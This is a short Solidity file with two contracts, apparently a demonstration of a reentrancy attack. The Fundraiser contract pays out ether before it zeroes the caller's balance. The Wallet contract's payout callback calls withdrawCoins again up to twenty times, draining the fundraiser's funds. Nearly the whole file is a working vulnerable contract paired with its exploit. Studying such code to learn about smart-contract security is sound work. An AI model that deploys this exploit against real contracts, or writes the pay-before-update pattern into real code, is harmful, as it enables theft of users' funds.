pragma solidity ^0.4.24;

contract Fundraiser {
    mapping(address=>uint) balances;

    function withdrawCoins() public {
        uint withdrawAmount = balances[msg.sender];
        Wallet wallet = Wallet(msg.sender);
        wallet.payout.value(withdrawAmount)();
        balances[msg.sender] = 0;
    }

    function getBalance() constant public returns (uint) {
        return address(this).balance;
    }

    function contribute() payable public {
        balances[msg.sender] += msg.value;
    }

    function() payable public {

    }
}

contract Wallet {

    Fundraiser fundraiser;
    uint recursion = 20;

    function Wallet(address fundraiserAddress) {
        fundraiser = Fundraiser(fundraiserAddress);
    }

    function contribute(uint amount) payable{
        fundraiser.contribute.value(amount)();
    }

    function withdraw(){
        fundraiser.withdrawCoins();
    }

    function getBalance() constant returns (uint) {
        return address(this).balance;
    }

    function payout() payable {
        if (recursion > 0) {
            recursion--;
            fundraiser.withdrawCoins();
        }
    }

    function() payable {

    }
}